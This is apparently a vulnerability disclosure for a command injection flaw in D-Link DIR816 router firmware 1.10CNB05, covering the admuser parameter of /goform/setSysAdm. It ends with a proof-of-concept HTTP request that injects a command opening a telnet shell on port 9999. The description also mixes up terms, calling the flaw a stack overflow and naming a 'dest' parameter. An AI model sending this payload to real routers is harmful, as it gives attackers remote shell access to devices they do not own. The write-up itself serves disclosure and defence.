# DLink DIR816 command injection vulnerabilities
## Affected Version
DLink DIR816 1.10CNB05
## Vulnerability Description
In DLink DIR816 routers with firmware version 1.10CNB05, the dest parameter of route /goform/setSysAdm has a command injection vulnerabilities, which can lead to remote arbitrary code execution.
## Vulnerability Detail
There is a stack overflow vulnerability in the sub_4569DC function in DLink DIR816 firmware 1.10CNB05. The function sub_4569DC, registered to handle the "setSysAdm" web form, accepts the admuser parameters from a Web request via the variables v4. This untrusted input is directly concatenated into multiple shell command strings without any sanitization or escaping. The call doSystem((int)"sed -e 's/^%s:%s:/' /etc/passwd > /etc/newpw", v2, Var); leads to an OS Command Injection vulnerability. An attacker can provide a specially crafted value for admuser containing shell metacharacters (such as ;, &, |, or `) to execute arbitrary commands with the privileges of the web server. A secondary injection point exists in the call doSystem((int)"chpasswd.sh %s %s", Var, v4).

![img](./img/setSysAdm-Admuser.png)

## Poc
```py
POST /goform/setSysAdm HTTP/1.1
Host: 192.168.1.1
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Cookie: curShow=

admuser=admin; /usr/sbin/telnetd -l /bin/sh -p 9999;&admpass=password123&tokenid=1936217320
```
